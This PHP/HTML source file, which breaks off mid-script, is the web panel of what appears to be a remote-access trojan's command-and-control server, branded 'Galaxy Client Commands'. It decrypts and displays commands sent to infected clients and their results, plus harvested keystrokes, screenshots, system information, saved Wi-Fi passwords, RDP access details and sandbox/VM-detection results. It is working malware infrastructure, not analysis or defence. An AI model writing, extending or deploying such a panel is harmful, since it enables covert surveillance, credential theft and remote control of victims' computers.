<?php
// log-viewer.php - Web dashboard for viewing client command logs and user data
require_once __DIR__ . '/Config.php';
Config::init();

// Session settings
ini_set('session.cookie_secure', 0); // Set to 1 for HTTPS in production
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_samesite', 'Lax');

// Start session
session_start();

// Connect to database with PDO
try {
    $pdo = new PDO(
        "mysql:host=" . Config::$DB_HOST . ";dbname=" . Config::$DB_NAME . ";charset=utf8mb4",
        Config::$DB_USER,
        Config::$DB_PASS,
        [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
            PDO::ATTR_EMULATE_PREPARES => false,
        ]
    );
} catch (PDOException $e) {
    error_log("Database connection failed: " . $e->getMessage(), 3, Config::$ERROR_LOG);
    die("Database connection failed: " . htmlspecialchars($e->getMessage()));
}

// Decrypt function
function decrypt($encryptedData, $key)
{
    try {
        if (!$encryptedData || !is_string($encryptedData)) {
            error_log("Decrypt: No data or invalid type: " . var_export($encryptedData, true), 3, Config::$ERROR_LOG);
            return '[No data]';
        }

        if (str_contains($encryptedData, '::')) {
            list($ciphertext, $iv) = explode('::', $encryptedData, 2);
            if (empty($ciphertext) || empty($iv)) {
                error_log("Decrypt: Invalid ciphertext or IV: ciphertext=" . substr($ciphertext, 0, 50) . ", iv=$iv", 3, Config::$ERROR_LOG);
                return '[Decryption failed: Invalid format]';
            }

            $ivDecoded = base64_decode($iv, true);
            if ($ivDecoded === false || strlen($ivDecoded) !== 16) {
                error_log("Decrypt: Invalid IV after base64 decode: " . $iv, 3, Config::$ERROR_LOG);
                return '[Decryption failed: Invalid IV]';
            }

            $keyDecoded = base64_decode($key);
            if ($keyDecoded === false) {
                error_log("Decrypt: Invalid key: " . $key, 3, Config::$ERROR_LOG);
                return '[Decryption failed: Invalid key]';
            }

            $decrypted = openssl_decrypt(
                $ciphertext,
                'aes-256-cbc',
                $keyDecoded,
                0,
                $ivDecoded
            );

            if ($decrypted === false) {
                error_log("Decrypt: AES decryption failed: ciphertext=" . substr($ciphertext, 0, 50), 3, Config::$ERROR_LOG);
                return '[Decryption failed: AES error]';
            }

            error_log("Decrypt: AES decrypted: " . substr($decrypted, 0, 50), 3, Config::$ERROR_LOG);

            $jsonDecoded = json_decode($decrypted, true);
            if ($jsonDecoded !== null) {
                if (isset($jsonDecoded['content']) && is_string($jsonDecoded['content'])) {
                    $content = preg_replace('/^\xEF\xBB\xBF/', '', $jsonDecoded['content']);
                    $lines = explode("\n", $content);
                    $formattedContent = implode("\n", array_map('trim', $lines));
                    error_log("Decrypt: Formatted content: " . substr($formattedContent, 0, 50), 3, Config::$ERROR_LOG);
                    return $formattedContent;
                }
                error_log("Decrypt: JSON detected, formatting with unescaped unicode", 3, Config::$ERROR_LOG);
                return json_encode($jsonDecoded, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
            }

            return $decrypted;
        }

        error_log("Decrypt: No IV separator, trying base64 + gzip: " . substr($encryptedData, 0, 50), 3, Config::$ERROR_LOG);

        $base64Decoded = base64_decode($encryptedData, true);
        if ($base64Decoded === false) {
            error_log("Decrypt: Base64 decode failed: " . substr($encryptedData, 0, 50), 3, Config::$ERROR_LOG);
            return $encryptedData;
        }

        $uncompressed = @gzdecode($base64Decoded);
        if ($uncompressed === false) {
            error_log("Decrypt: Gzip decode failed: " . substr($base64Decoded, 0, 50), 3, Config::$ERROR_LOG);
            return $base64Decoded;
        }

        error_log("Decrypt: Gzip decoded: " . substr($uncompressed, 0, 50), 3, Config::$ERROR_LOG);

        $jsonDecoded = json_decode($uncompressed, true);
        if ($jsonDecoded !== null) {
            if (isset($jsonDecoded['content']) && is_string($jsonDecoded['content'])) {
                $content = preg_replace('/^\xEF\xBB\xBF/', '', $jsonDecoded['content']);
                $lines = explode("\n", $content);
                $formattedContent = implode("\n", array_map('trim', $lines));
                error_log("Decrypt: Formatted content: " . substr($formattedContent, 0, 50), 3, Config::$ERROR_LOG);
                return $formattedContent;
            }
            error_log("Decrypt: JSON detected, formatting with unescaped unicode", 3, Config::$ERROR_LOG);
            return json_encode($jsonDecoded, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        }

        return $uncompressed;
    } catch (Exception $e) {
        error_log("Decrypt error: " . $e->getMessage() . ", raw data: " . substr($encryptedData, 0, 50), 3, Config::$ERROR_LOG);
        return '[Decryption error: ' . htmlspecialchars($e->getMessage()) . ']';
    }
}

// Format JSON for download
function formatJsonForDownload($jsonString)
{
    $jsonDecoded = json_decode($jsonString, true);
    if ($jsonDecoded === null) {
        return $jsonString;
    }

    $output = [];
    foreach ($jsonDecoded as $key => $value) {
        if (is_array($value)) {
            $value = json_encode($value, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        }
        $output[] = "$key: $value";
    }
    return implode("\n", $output);
}

// Password hash for dashboard
$stored_hash = '$2y$12$Y';

// Handle login
$logged_in = isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$logged_in) {
    $password = $_POST['password'] ?? '';
    if (password_verify($password, $stored_hash)) {
        $_SESSION['logged_in'] = true;
        header("Location: log-viewer.php");
        exit;
    } else {
        $error = "Invalid password";
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: log-viewer.php");
    exit;
}

// Fetch command logs via AJAX
if (isset($_GET['get_logs']) && $logged_in) {
    header('Content-Type: application/json; charset=utf-8');
    try {
        $stmt = $pdo->query("
            SELECT id, client_id, command, status, result, created_at, updated_at, completed_at
            FROM client_commands
            ORDER BY created_at DESC LIMIT 100
        ");
        $logs = $stmt->fetchAll();

        foreach ($logs as &$log) {
            $log['raw_result'] = $log['result'];
            $log['command'] = decrypt($log['command'], Config::$ENCRYPTION_KEY);
            $log['result'] = $log['result'] ? decrypt($log['result'], Config::$ENCRYPTION_KEY) : '';
        }

        echo json_encode(['logs' => $logs], JSON_UNESCAPED_UNICODE);
    } catch (PDOException $e) {
        error_log("Failed to fetch logs: " . $e->getMessage(), 3, Config::$ERROR_LOG);
        echo json_encode(['error' => 'Failed to fetch logs: ' . htmlspecialchars($e->getMessage())], JSON_UNESCAPED_UNICODE);
    }
    exit;
}

// Fetch user data via AJAX
if (isset($_GET['get_user_data']) && $logged_in) {
    header('Content-Type: application/json; charset=utf-8');
    try {
        $stmt = $pdo->query("
            SELECT id, client_id, keystrokes, system_info, screenshot_path, created_at
            FROM user_data
            ORDER BY created_at DESC LIMIT 100
        ");
        $user_data = $stmt->fetchAll();

        foreach ($user_data as &$data) {
            $data['raw_keystrokes'] = $data['keystrokes'];
            $data['raw_system_info'] = $data['system_info'];
            $data['keystrokes'] = $data['keystrokes'] ? ($data['keystrokes'][0] === '{' ? formatJsonForDownload($data['keystrokes']) : $data['keystrokes']) : '';
            $data['system_info'] = $data['system_info'] ? formatJsonForDownload($data['system_info']) : '';
            // Convert absolute screenshot path to relative URL
            if ($data['screenshot_path']) {
                $data['screenshot_url'] = str_replace(__DIR__ . '/', '', $data['screenshot_path']);
            } else {
                $data['screenshot_url'] = '';
            }
        }

        echo json_encode(['user_data' => $user_data], JSON_UNESCAPED_UNICODE);
    } catch (PDOException $e) {
        error_log("Failed to fetch user data: " . $e->getMessage(), 3, Config::$ERROR_LOG);
        echo json_encode(['error' => 'Failed to fetch user data: ' . htmlspecialchars($e->getMessage())], JSON_UNESCAPED_UNICODE);
    }
    exit;
}

if (isset($_GET['get_vm_status']) && $logged_in) {
    header('Content-Type: application/json; charset=utf-8');
    try {
        $stmt = $pdo->query("
            SELECT client_id, vm_details, created_at
            FROM client_vm_status
            ORDER BY created_at DESC LIMIT 100
        ");
        $vm_status = $stmt->fetchAll();

        foreach ($vm_status as &$status) {
            $status['vm_details'] = $status['vm_details'] ? decrypt($status['vm_details'], Config::$ENCRYPTION_KEY) : '';
        }

        echo json_encode(['vm_status' => $vm_status], JSON_UNESCAPED_UNICODE);
    } catch (PDOException $e) {
        error_log("Failed to fetch VM status: " . $e->getMessage(), 3, Config::$ERROR_LOG);
        echo json_encode(['error' => 'Failed to fetch VM status: ' . htmlspecialchars($e->getMessage())], JSON_UNESCAPED_UNICODE);
    }
    exit;
}

if (isset($_GET['get_wifi_logs']) && $logged_in) {
    header('Content-Type: application/json; charset=utf-8');
    try {
        $stmt = $pdo->query("
            SELECT id, client_id, message, created_at
            FROM client_logs
            WHERE log_type = 'wifi'
            ORDER BY created_at DESC LIMIT 100
        ");
        $wifi_logs = $stmt->fetchAll();

        foreach ($wifi_logs as &$log) {
            $log['message'] = $log['message'] ? decrypt($log['message'], Config::$ENCRYPTION_KEY) : '';
        }

        echo json_encode(['wifi_logs' => $wifi_logs], JSON_UNESCAPED_UNICODE);
    } catch (PDOException $e) {
        error_log("Failed to fetch Wi-Fi logs: " . $e->getMessage(), 3, Config::$ERROR_LOG);
        echo json_encode(['error' => 'Failed to fetch Wi-Fi logs: ' . htmlspecialchars($e->getMessage())], JSON_UNESCAPED_UNICODE);
    }
    exit;
}

if (isset($_GET['get_rdp_logs']) && $logged_in) {
    header('Content-Type: application/json; charset=utf-8');
    try {
        $stmt = $pdo->query("
            SELECT id, client_id, message, created_at
            FROM client_logs
            WHERE log_type = 'rdp'
            ORDER BY created_at DESC LIMIT 100
        ");
        $rdp_logs = $stmt->fetchAll();

        foreach ($rdp_logs as &$log) {
            $log['message'] = $log['message'] ? decrypt($log['message'], Config::$ENCRYPTION_KEY) : '';
        }

        echo json_encode(['rdp_logs' => $rdp_logs], JSON_UNESCAPED_UNICODE);
    } catch (PDOException $e) {
        error_log("Failed to fetch RDP logs: " . $e->getMessage(), 3, Config::$ERROR_LOG);
        echo json_encode(['error' => 'Failed to fetch RDP logs: ' . htmlspecialchars($e->getMessage())], JSON_UNESCAPED_UNICODE);
    }
    exit;
}

// Download log
if (isset($_GET['download_log']) && $logged_in && isset($_GET['log_id'])) {
    try {
        $log_id = filter_var($_GET['log_id'], FILTER_VALIDATE_INT);
        if ($log_id === false) {
            die("Invalid log ID");
        }

        $stmt = $pdo->prepare("
            SELECT client_id, command, status, result, created_at, completed_at
            FROM client_commands
            WHERE id = ?
        ");
        $stmt->execute([$log_id]);
        $log = $stmt->fetch();

        if (!$log) {
            die("Log not found");
        }

        $raw_result = $log['result'];
        $log['command'] = decrypt($log['command'], Config::$ENCRYPTION_KEY);
        $log['result'] = $log['result'] ? decrypt($log['result'], Config::$ENCRYPTION_KEY) : 'No result';

        $content = "Client ID: {$log['client_id']}\n";
        $content .= "Command: {$log['command']}\n";
        $content .= "Status: {$log['status']}\n";
        $content .= "Result:\n";
        $content .= formatJsonForDownload($log['result']) . "\n";
        $content .= "Created At: {$log['created_at']}\n";
        $content .= "Completed At: " . ($log['completed_at'] ? $log['completed_at'] : 'N/A') . "\n";

        header('Content-Type: text/plain; charset=utf-8');
        header('Content-Disposition: attachment; filename="log_' . $log_id . '.txt"');
        header('Content-Length: ' . strlen($content));
        echo $content;
        exit;
    } catch (PDOException $e) {
        error_log("Failed to download log: " . $e->getMessage(), 3, Config::$ERROR_LOG);
        die("Failed to download log");
    }
}

// Download user data
if (isset($_GET['download_user_data']) && $logged_in && isset($_GET['data_id'])) {
    try {
        $data_id = filter_var($_GET['data_id'], FILTER_VALIDATE_INT);
        if ($data_id === false) {
            die("Invalid data ID");
        }

        $stmt = $pdo->prepare("
            SELECT client_id, keystrokes, system_info, screenshot_path, created_at
            FROM user_data
            WHERE id = ?
        ");
        $stmt->execute([$data_id]);
        $data = $stmt->fetch();

        if (!$data) {
            die("Data not found");
        }

        $content = "Client ID: {$data['client_id']}\n";
        $content .= "Keystrokes:\n" . ($data['keystrokes'] ? formatJsonForDownload($data['keystrokes']) : 'No keystrokes') . "\n";
        $content .= "System Info:\n" . ($data['system_info'] ? formatJsonForDownload($data['system_info']) : 'No system info') . "\n";
        $content .= "Screenshot: " . ($data['screenshot_path'] ? $data['screenshot_path'] : 'No screenshot') . "\n";
        $content .= "Created At: {$data['created_at']}\n";

        header('Content-Type: text/plain; charset=utf-8');
        header('Content-Disposition: attachment; filename="user_data_' . $data_id . '.txt"');
        header('Content-Length: ' . strlen($content));
        echo $content;
        exit;
    } catch (PDOException $e) {
        error_log("Failed to download user data: " . $e->getMessage(), 3, Config::$ERROR_LOG);
        die("Failed to download user data");
    }
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galaxy Client Commands Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background: url('viewer/wallpaper.jpeg');
            background-size: cover;
            background-attachment: fixed;
            backdrop-filter: blur(5px);
        }

        .glass-card {
            background: rgba(10, 10, 10, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 215, 0, 0.2);
            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
            animation: slide-up 0.8s ease-out;
        }

        .log-entry,
        .data-entry {
            transition: transform 0.3s ease;
            cursor: pointer;
        }

        .log-entry:hover,
        .data-entry:hover {
            transform: translateY(-5px);
        }

        .black-hole-glow {
            background: linear-gradient(45deg, #ffd700, #8b4513, #000000);
            -webkit-text-fill-color: transparent;
            -webkit-background-clip: text;
            animation: pulse-glow 3s infinite ease-in-out;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            z-index: 50;
            animation: zoom-in 0.5s ease-out;
        }

        .modal-content {
            background: rgba(20, 20, 20, 0.95);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 215, 0, 0.3);
            margin: 2% auto;
            padding: 20px;
            width: 90%;
            max-width: 1200px;
            height: 90vh;
            overflow-y: auto;
            border-radius: 10px;
        }

        .editor {
            background: #1e1e1e;
            color: #d4d4d4;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            padding: 15px;
            border-radius: 5px;
            white-space: pre-wrap;
            min-height: 200px;
            resize: none;
            width: 100%;
            border: 1px solid rgba(255, 215, 0, 0.2);
        }

        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 10px;
        }

        .tab {
            padding: 8px 16px;
            background: #2d2d2d;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .tab:hover {
            background: #4a4a4a;
        }

        .tab.active {
            background: #ffd700;
            color: #000;
        }

        .screenshot-img {
            max-width: 100%;
            height: auto;
            border-radius: 5px;
            border: 1px solid rgba(255, 215, 0, 0.2);
        }

        @keyframes slide-up {
            from {
                opacity: 0;
                transform: translateY(20px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes pulse-glow {

            0%,
            100% {
                background: linear-gradient(45deg, #ffd700, #8b4513, #000000);
                -webkit-background-clip: text;
                filter: brightness(1);
            }

            50% {
                background: linear-gradient(45deg, #ffa500, #654321, #000000);
                -webkit-background-clip: text;
                filter: brightness(1.5);
            }
        }

        @keyframes zoom-in {
            from {
                opacity: 0;
                transform: scale(0.8);
            }

            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        .fade-in {
            animation: fade-in 1s ease-out;
        }

        @keyframes fade-in {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }
    </style>
</head>

<body class="min-h-screen text-gray-200 flex flex-col">
    <div class="container mx-auto p-4 flex-grow">
        <?php if (!$logged_in): ?>
            <!-- Login form -->
            <div class="max-w-md mx-auto glass-card rounded-xl p-8 mt-20 fade-in">
                <h2 class="text-3xl font-bold text-center black-hole-glow mb-6">Enter the Galaxy</h2>
                <?php if (isset($error)): ?>
                    <p class="text-red-500 text-center mb-4"><?php echo htmlspecialchars($error); ?></p>
                <?php endif; ?>
                <form method="POST" class="space-y-4">
                    <div>
                        <label for="password" class="block text-sm font-medium">Password</label>
                        <input type="password" id="password" name="password" required
                            class="w-full mt-1 p-2 rounded-md bg-gray-800 border border-gray-600 focus:outline-none focus:ring-2 focus:ring-yellow-500">
                    </div>
                    <button type="submit"
                        class="w-full py-2 px-4 bg-yellow-600 hover:bg-yellow-700 rounded-md text-white font-semibold">
                        Login
                    </button>
                </form>
            </div>
        <?php else: ?>
            <!-- Logs dashboard -->
            <div class="flex justify-between items-center mb-8 fade-in">
                <h1 class="text-4xl font-bold black-hole-glow">Galaxy Client Commands</h1>
                <a href="?logout" class="py-2 px-4 bg-red-600 hover:bg-red-700 rounded-md text-white">
                    Logout
                </a>
            </div>
            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
                <!-- Completed logs -->
                <div class="glass-card rounded-xl p-6">
                    <h2 class="text-2xl font-semibold text-green-400 mb-4">Completed Commands</h2>
                    <div id="completed-logs" class="space-y-4 max-h-[70vh] overflow-y-auto"></div>
                </div>
                # server/log-viewer.php (در بخش HTML، داخل div.grid)
                <div class="glass-card rounded-xl p-6">
                    <h2 class="text-2xl font-semibold text-purple-400 mb-4">VM Detection Status</h2>
                    <div id="vm-status" class="space-y-4 max-h-[70vh] overflow-y-auto"></div>
                </div>
                <!-- Pending logs -->
                <div class="glass-card rounded-xl p-6">
                    <h2 class="text-2xl font-semibold text-yellow-400 mb-4">Pending Commands</h2>
                    <div id="pending-logs" class="space-y-4 max-h-[70vh] overflow-y-auto"></div>
                </div>
                <div class="glass-card rounded-xl p-6">
                    <h2 class="text-2xl font-semibold text-indigo-400 mb-4">Wi-Fi Passwords</h2>
                    <div id="wifi-logs" class="space-y-4 max-h-[70vh] overflow-y-auto"></div>
                </div>
                <!-- Failed logs -->
                <div class="glass-card rounded-xl p-6">
                    <h2 class="text-2xl font-semibold text-red-400 mb-4">Failed Commands</h2>
                    <div id="failed-logs" class="space-y-4 max-h-[70vh] overflow-y-auto"></div>
                </div>
                <!-- Client Data -->
                <div class="glass-card rounded-xl p-6">
                    <h2 class="text-2xl font-semibold text-blue-400 mb-4">Client Data</h2>
                    <div id="client-data" class="space-y-4 max-h-[70vh] overflow-y-auto"></div>
                </div>
                <div class="glass-card rounded-xl p-6">
                    <h2 class="text-2xl font-semibold text-purple-400 mb-4">RDP Connections</h2>
                    <div id="rdp-logs" class="space-y-4 max-h-[70vh] overflow-y-auto"></div>
                </div>
            </div>
            <!-- Full-screen modal for logs -->
            <div id="log-modal" class="modal">
                <div class="modal-content">
                    <div class="flex justify-between items-center mb-4">
                        <h2 class="text-2xl font-semibold text-yellow-400">Log Details</h2>
                        <button id="close-log-modal" class="text-gray-400 hover:text-white text-2xl">×</button>
                    </div>
                    <div class="space-y-4">
                        <p><strong>Client ID:</strong> <span id="log-modal-client-id"></span></p>
                        <p><strong>Command:</strong> <span id="log-modal-command"></span></p>
                        <p><strong>Status:</strong> <span id="log-modal-status"></span></p>
                        <p><strong>Created At:</strong> <span id="log-modal-created-at"></span></p>
                        <p><strong>Completed At:</strong> <span id="log-modal-completed-at"></span></p>
                        <div>
                            <div class="tabs">
                                <div class="tab active" data-tab="decrypted">Decrypted Result</div>
                                <div class="tab" data-tab="raw">Raw Result</div>
                            </div>
                            <textarea class="editor" id="log-modal-result-decrypted" readonly></textarea>
                            <textarea class="editor" id="log-modal-result-raw" readonly style="display: none;"></textarea>
                        </div>
                        <button id="log-download-log" class="py-2 px-4 bg-green-600 hover:bg-green-700 rounded-md text-white font-semibold">
                            Download Log
                        </button>
                    </div>
                </div>
            </div>

            <div id="rdp-modal" class="modal">
                <div class="modal-content">
                    <div class="flex justify-between items-center mb-4">
                        <h2 class="text-2xl font-semibold text-yellow-500">RDP Connection Details</h2>
                        <button id="close-rdp-modal" class="text-gray-400 hover:text-white text-2xl">×</button>
                    </div>
                    <div class="space-y-2">
                        <p><strong>Client ID:</strong> <span id="rdp-modal-client-id"></span></p>
                        <p><strong>Created At:</strong> <span id="rdp-modal-created-at"></span></p>
                        <div>
                            <textarea class="editor" id="rdp-modal-content" readonly></textarea>
                        </div>
                    </div>
                </div>
            </div>

            <div id="wifi-modal" class="modal">
                <div class="modal-content">
                    <div class="flex justify-between items-center mb-4">
                        <h2 class="text-2xl font-semibold text-indigo-400">Wi-Fi Password Details</h2>
                        <button id="close-wifi-modal" class="text-gray-400 hover:text-white text-2xl">×</button>
                    </div>
                    <div class="space-y-2">
                        <p><strong>Client ID:</strong> <span id="wifi-modal-client-id"></span></p>
                        <p><strong>Created At:</strong> <span id="wifi-modal-created-at"></span></p>
                        <div>
                            <textarea class="editor" id="wifi-modal-content" readonly></textarea>
                        </div>
                    </div>
                </div>
            </div>
            <!-- Full-screen modal for user data -->
            <div id="data-modal" class="modal">
                <div class="modal-content">
                    <div class="flex justify-between items-center mb-4">
                        <h2 class="text-2xl font-semibold text-blue-400">Client Data Details</h2>
                        <button id="close-data-modal" class="text-gray-400 hover:text-white text-2xl">×</button>
                    </div>
                    <div class="space-y-4">
                        <p><strong>Client ID:</strong> <span id="data-modal-client-id"></span></p>
                        <p><strong>Created At:</strong> <span id="data-modal-created-at"></span></p>
                        <div>
                            <div class="tabs">
                                <div class="tab active" data-tab="keystrokes">Keystrokes</div>
                                <div class="tab" data-tab="system_info">System Info</div>
                                <div class="tab" data-tab="screenshot">Screenshot</div>
                            </div>
                            <textarea class="editor" id="data-modal-keystrokes" readonly></textarea>
                            <textarea class="editor" id="data-modal-system-info" readonly style="display: none;"></textarea>
                            <img id="data-modal-screenshot" class="screenshot-img" style="display: none;" alt="Screenshot">
                        </div>
                        <button id="data-download-data" class="py-2 px-4 bg-green-600 hover:bg-green-700 rounded-md text-white font-semibold">
                            Download Data
                        </button>
                    </div>
                </div>
            </div>
        <?php endif; ?>
    </div>

    <?php if ($logged_in): ?>
        <script>
            function fetchLogsAndData() {
                // Fetch command logs
                fetch('?get_logs', {
                        method: 'GET',
                        headers: {
                            'Accept': 'application/json'
                        }
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.error) {
                            console.error(data.error);
                            return;
                        }

                        const completedLogs = document.getElementById('completed-logs');
                        const pendingLogs = document.getElementById('pending-logs');
                        const failedLogs = document.getElementById('failed-logs');

                        completedLogs.innerHTML = '';
                        pendingLogs.innerHTML = '';
                        failedLogs.innerHTML = '';

                        data.logs.forEach(log => {
                            const logElement = document.createElement('div');
                            logElement.className = 'log-entry p-3 rounded-md bg-gray-900/50 border border-gray-700';
                            logElement.dataset.log = JSON.stringify(log);
                            logElement.innerHTML = `
                            <p class="text-sm text-gray-400">${new Date(log.created_at).toLocaleString()}</p>
                            <p class="text-gray-200"><strong>Client ID:</strong> ${log.client_id}</p>
                            <p class="text-gray-200"><strong>Command:</strong> ${log.command}</p>
                            <p class="text-gray-200"><strong>Result:</strong> ${log.result.substring(0, 100)}${log.result.length > 100 ? '...' : ''}</p>
                            <p class="text-gray-200"><strong>Status:</strong> ${log.status}</p>
                        `;

                            if (log.status === 'completed') {
                                logElement.addEventListener('click', () => openLogModal(log));
                                completedLogs.appendChild(logElement);
                            } else if (log.status === 'pending') {
                                pendingLogs.appendChild(logElement);
                            } else if (log.status === 'failed') {
                                failedLogs.appendChild(logElement);
                            }
                        });
                    })
                    .catch(error => console.error('Error fetching logs:', error));

                // Fetch user data
                fetch('?get_user_data', {
                        method: 'GET',
                        headers: {
                            'Accept': 'application/json'
                        }
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.error) {
                            console.error(data.error);
                            return;
                        }

                        const clientData = document.getElementById('client-data');
                        clientData.innerHTML = '';

                        data.user_data.forEach(item => {
                            const dataElement = document.createElement('div');
                            dataElement.className = 'data-entry p-3 rounded-md bg-gray-900/50 border border-gray-700';
                            dataElement.dataset.data = JSON.stringify(item);
                            dataElement.innerHTML = `
                            <p class="text-sm text-gray-400">${new Date(item.created_at).toLocaleString()}</p>
                            <p class="text-gray-200"><strong>Client ID:</strong> ${item.client_id}</p>
                            <p class="text-gray-200"><strong>Keystrokes:</strong> ${item.keystrokes.substring(0, 100)}${item.keystrokes.length > 100 ? '...' : ''}</p>
                            <p class="text-gray-200"><strong>System Info:</strong> ${item.system_info.substring(0, 100)}${item.system_info.length > 100 ? '...' : ''}</p>
                            <p class="text-gray-200"><strong>Screenshot:</strong> ${item.screenshot_url ? 'Available' : 'None'}</p>
                        `;

                            dataElement.addEventListener('click', () => openDataModal(item));
                            clientData.appendChild(dataElement);
                        });
                    })
                    .catch(error => console.error('Error fetching user data:', error));
            }
            fetch('?get_vm_status', {
                    method: 'GET',
                    headers: {
                        'Accept': 'application/json'
                    }
                })
                .then(response => response.json())
                .then(data => {
                    if (data.error) {
                        console.error(data.error);
                        return;
                    }

                    const vmStatus = document.getElementById('vm-status');
                    vmStatus.innerHTML = '';

                    data.vm_status.forEach(status => {
                        const statusElement = document.createElement('div');
                        statusElement.className = 'vm-status-entry p-3 rounded-md bg-gray-900/50 border border-gray-700';
                        const isVM = JSON.parse(status.vm_details).is_vm ? 'Virtual Machine 🕵️' : 'Physical Machine ✅';
                        statusElement.innerHTML = `
                <p class="text-sm text-gray-400">${new Date(status.created_at).toLocaleString()}</p>
                <p class="text-gray-200"><strong>Client ID:</strong> ${status.client_id}</p>
                <p class="text-gray-200"><strong>Status:</strong> ${isVM}</p>
                <p class="text-gray-200"><strong>Details:</strong> ${status.vm_details.substring(0, 100)}${status.vm_details.length > 100 ? '...' : ''}</p>
            `;
                        vmStatus.appendChild(statusElement);
                    });
                })
                .catch(error => console.error('Error fetching VM status:', error));

            fetch('?get_rdp_logs', {
                    method: 'GET',
                    headers: {
                        'Accept': 'application/json'
                    }
                })
                .then(response => response.json())
                .then(data => {
                    if (data.error) {
                        console.error(data.error);
                        return;
                    }

                    const rdpLogs = document.getElementById('rdp-logs');
                    rdpLogs.innerHTML = '';

                    data.rdp_logs.forEach(log => {
                        const logElement = document.createElement('div');
                        logElement.className = 'log-entry p-3 rounded-md bg-gray-900/50 border border-gray-700';
                        logElement.dataset.log = JSON.stringify(log);
                        let parsedData;
                        try {
                            parsedData = JSON.parse(log.message);
                        } catch (e) {
                            parsedData = {
                                public_ip: 'N/A',
                                username: 'N/A',
                                status: 'Unknown'
                            };
                        }
                        const status = parsedData.status === 'success' ? (parsedData.username ? 'Enabled' : 'Disabled') : 'Failed';
                        logElement.innerHTML = `
                <p class="text-sm text-gray-400">${new Date(log.created_at).toLocaleString()}</p>
                <p class="text-gray-200"><strong>Client ID:</strong> ${log.client_id}</p>
                <p class="text-gray-200"><strong>Status:</strong> ${status}</p>
                <p class="text-gray-200"><strong>Public IP:</strong> ${parsedData.public_ip || 'N/A'}</p>
                <p class="text-gray-200"><strong>Username:</strong> ${parsedData.username || 'N/A'}</p>
            `;
                        logElement.addEventListener('click', () => openRDPModal(log));
                        rdpLogs.appendChild(logElement);
                    });
                })
                .catch(error => console.error('Error fetching RDP logs:', error));

            function openRDPModal(log) {
                const modal = document.getElementById('rdp-modal');
                document.getElementById('rdp-modal-client-id').textContent = log.client_id;
                document.getElementById('rdp-modal-created-at').textContent = new Date(log.created_at).toLocaleString();
                document.getElementById('rdp-modal-content').value = log.message || '{}';

                modal.style.display = 'block';
            }

            document.getElementById('close-rdp-modal').addEventListener('click', () => {
                document.getElementById('rdp-modal').style.display = 'none';
            });

            window.addEventListener('click', (event) => {
                if (event.target === document.getElementById('rdp-modal')) {
                    document.getElementById('rdp-modal').style.display = 'none';
                }
            });

            function openLogModal(log) {
                const modal = document.getElementById('log-modal');
                document.getElementById('log-modal-client-id').textContent = log.client_id;
                document.getElementById('log-modal-command').textContent = log.command;
                document.getElementById('log-modal-status').textContent = log.status;
                document.getElementById('log-modal-created-at').textContent = new Date(log.created_at).toLocaleString();
                document.getElementById('log-modal-completed-at').textContent = log.completed_at ? new Date(log.completed_at).toLocaleString() : 'N/A';
                document.getElementById('log-modal-result-decrypted').value = log.result || 'No result';
                document.getElementById('log-modal-result-raw').value = log.raw_result || 'No raw result';

                const downloadButton = document.getElementById('log-download-log');
                downloadButton.onclick = () => {
                    window.location.href = `?download_log&log_id=${log.id}`;
                };

                const tabs = document.querySelectorAll('#log-modal .tab');
                const decryptedEditor = document.getElementById('log-modal-result-decrypted');
                const rawEditor = document.getElementById('log-modal-result-raw');

                tabs.forEach(tab => {
                    tab.addEventListener('click', () => {
                        tabs.forEach(t => t.classList.remove('active'));
                        tab.classList.add('active');

                        if (tab.dataset.tab === 'decrypted') {
                            decryptedEditor.style.display = 'block';
                            rawEditor.style.display = 'none';
                        } else {
                            decryptedEditor.style.display = 'none';
                            rawEditor.style.display = 'block';
                        }
                    });
                });

                tabs[0].classList.add('active');
                decryptedEditor.style.display = 'block';
                rawEditor.style.display = 'none';

                modal.style.display = 'block';
            }

            fetch('?get_wifi_logs', {
                    method: 'GET',
                    headers: {
                        'Accept': 'application/json'
                    }
                })
                .then(response => response.json())
                .then(data => {
                    if (data.error) {
                        console.error(data.error);
                        return;
                    }

                    const wifiLogs = document.getElementById('wifi-logs');
                    wifiLogs.innerHTML = '';

                    data.wifi_logs.forEach(log => {
                        const logElement = document.createElement('div');
                        logElement.className = 'log-entry p-3 rounded-md bg-gray-900/50 border border-gray-700';
                        logElement.dataset.log = JSON.stringify(log);
                        let parsedData;
                        try {
                            parsedData = JSON.parse(log.message);
                        } catch (e) {
                            parsedData = {
                                wifi_profiles: []
                            };
                        }
                        const profileCount = parsedData.wifi_profiles ? parsedData.wifi_profiles.length : 0;
                        logElement.innerHTML = `
            <p class="text-sm text-gray-400">${new Date(log.created_at).toLocaleString()}</p>
            <p class="text-gray-200"><strong>Client ID:</strong> ${log.client_id}</p>
            <p class="text-gray-200"><strong>Networks:</strong> ${profileCount} found</p>
        `;
